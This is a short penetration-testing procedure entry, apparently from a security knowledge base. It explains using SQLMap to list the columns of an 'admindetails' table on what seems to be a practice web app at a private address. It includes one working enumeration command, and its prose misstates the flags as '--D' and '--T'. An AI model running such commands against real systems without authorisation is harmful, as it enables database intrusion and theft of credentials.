---
id: f372ff1c-ee98-4593-814c-ad9e87d2889b
name: Using SQLMap to Dump Column Names
type: procedure
verified: true
submitted: true
created_at: '2020-08-19T18:56:34.641445+00:00'
updated_at: '2023-05-26T01:27:56.870610+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[sqli]]'
- '[[SQL Injection]]'
- '[[SQLMap]]'
- '[[Web Applications]]'
commands:
- '[[SQLMap to Dump Column Names]]'
---

# Using SQLMap to Dump Column Names

**Status**: ✓ Verified

## Summary

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields. --D is used to specify the database name, --T to specify the table name and --columns to list the column names 

## Description

# Description

SQLMap is an automated SQL Injection exploitation tool. This can be used to insert the SQL injection payloads through the application input fields.

*--D is used to specify the database name, --T to specify the table name and --columns to list the column names*



# Procedure



1. The below SQLMap command can be used to dump the column names from the table.









**Command** ([[SQLMap to Dump Column Names]]):

```bash
sqlmap -u '192.168.43.68/vcart/search.php?term=' -D vulcart -T admindetails --columns
```







## Platforms

- Web

## Commands Used

- [[SQLMap to Dump Column Names]]

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[sqli]]
- [[SQL Injection]]
- [[SQLMap]]
- [[Web Applications]]


